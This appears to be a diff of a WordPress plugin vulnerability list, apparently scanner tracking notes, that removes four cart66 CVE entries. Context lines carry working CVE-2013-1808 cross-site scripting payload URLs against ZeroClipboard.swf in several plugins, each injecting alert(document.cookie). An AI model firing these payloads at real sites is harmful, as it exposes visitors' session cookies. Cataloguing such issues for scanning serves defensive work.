@@ -20,8 +20,6 @@
 # CVE-2013-1808 wp-link-to-us wp-content/plugins/wp-link-to-us/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height wp-content/plugins/wp-link-to-us/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
 # CVE-2013-1808 wppygments wp-content/plugins/wppygments/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height wp-content/plugins/wppygments/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
 # CVE-2013-1808 zopim-live-chat wp-content/plugins/zopim-live-chat/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
-# CVE-2013-5977 cart66-lite
-# CVE-2013-5978 cart66-lite
 # CVE-2013-7129 Jplayer.swf ExternalInterface.call() method jQuery parameter XSS http://osvdb.org/92254
 # CVE-2013-7240 advanced-dewplayer N/A
 # CVE-2013-XXXX advanced-xml-reader http://www.openwall.com/lists/oss-security/2013/05/06/1
@@ -137,8 +135,6 @@
 # CVE-2014-9341
 # CVE-2014-9368 twitterdash
 # CVE-2014-9401 wp-limit-posts-automatically
-# CVE-2014-9442 cart66-lite 1.5.4
-# CVE-2014-9461 cart66 1.5.4
 # CVE-2014-9473 cforms2
 # CVE-2014-9570
 # CVE-2014-9570
